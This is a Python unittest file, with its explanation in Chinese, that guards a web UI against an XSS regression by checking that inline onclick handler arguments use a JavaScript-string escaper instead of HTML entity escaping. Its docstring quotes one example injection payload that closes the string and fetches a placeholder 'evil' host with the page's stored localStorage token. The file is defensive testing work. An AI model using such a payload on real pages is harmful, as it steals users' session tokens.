# -*- coding: utf-8 -*-
"""内联事件处理器里的参数必须用 jsq()，不能用 esc()。

`esc()` 做的是 HTML 转义：把 `'` 换成 `&#39;`。写在文本节点里是对的，但写在
`onclick="fn('…')"` 里就错了——浏览器先把属性值做实体解码，`&#39;` 又变回 `'`，
JS 字符串照样被闭合。上游 `/v1/models` 返回一个模型名
`x');fetch('http://evil/'+localStorage.token)//` 就能在页面里执行脚本。

本测试锁两条：
  1) 生成内联处理器的三种拼接形态不得再出现 `esc(`；
  2) `jsq()` 必须仍然同时转义反斜杠与单引号（工具本身被改弱也算回归）。
"""
from __future__ import annotations

import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
UI = ROOT / "app" / "ui"

# `onclick="fn(\'' + esc(x) + '\')"`：单引号 JS 字符串参数
UNSAFE_SHAPES = (
    re.compile(r"\\''\s*\+\s*esc\("),
    re.compile(r"\"',\s*'\"\s*\+\s*esc\("),
    re.compile(r"\\''\s*\+\s*esc\("),
)


class InlineHandlerEscapingTest(unittest.TestCase):
    def test_no_html_escape_inside_inline_handler_arguments(self):
        offenders = []
        for path in sorted(UI.glob("*.js")):
            text = path.read_text(encoding="utf-8", errors="replace")
            for number, line in enumerate(text.splitlines(), 1):
                for pattern in UNSAFE_SHAPES:
                    if pattern.search(line):
                        offenders.append(f"{path.name}:{number}: {line.strip()[:120]}")
                        break
        self.assertEqual(offenders, [],
                         "内联处理器参数仍用 esc()（会被实体解码还原成引号）：\n"
                         + "\n".join(offenders))

    def test_jsq_escapes_backslash_and_quote(self):
        source = (UI / "app.js").read_text(encoding="utf-8", errors="replace")
        self.assertIn('function jsq(s)', source)
        body = source[source.index('function jsq(s)'):]
        body = body[:body.index('\n}')]
        self.assertIn(r"\\\\", body, "jsq 必须先把反斜杠转义")
        self.assertIn(r"\\'", body, "jsq 必须把单引号转义成 \\'")

    def test_esc_still_escapes_quotes_for_text_nodes(self):
        source = (UI / "app.js").read_text(encoding="utf-8", errors="replace")
        body = source[source.index('function esc(s)'):]
        body = body[:body.index('\n}')]
        self.assertIn("&#39;", body)


if __name__ == "__main__":
    unittest.main()
